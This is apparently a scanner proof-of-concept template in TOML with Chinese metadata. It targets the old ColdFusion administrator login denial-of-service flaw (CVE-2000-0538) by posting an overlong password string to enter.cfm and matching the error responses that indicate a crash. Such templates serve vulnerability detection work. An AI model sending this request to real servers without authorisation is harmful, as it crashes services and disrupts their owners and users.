[info]
author = "AVE"
description = "通过向ColdFusion Administrator登录页面的密码字段提交超长字符串，导致服务进程崩溃，验证拒绝服务漏洞的存在"
id = "POC-AVE-2000-0443"
name = "Allaire ColdFusion Server 管理员登录密码拒绝服务漏洞 PoC"
severity = "medium"
tags = [
    "cve-2000-0538",
    "coldfusion",
    "dos",
]
vuln_id = [
    "CVE-2000-0538",
    "AVE-2000-0443",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/CFIDE/administrator/enter.cfm"
protocol = "http"

[poc.requests.body]
content = "adminpassword={{long_password}}"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "500",
    "Internal Server Error",
    "Service Unavailable",
    "Connection Reset",
]
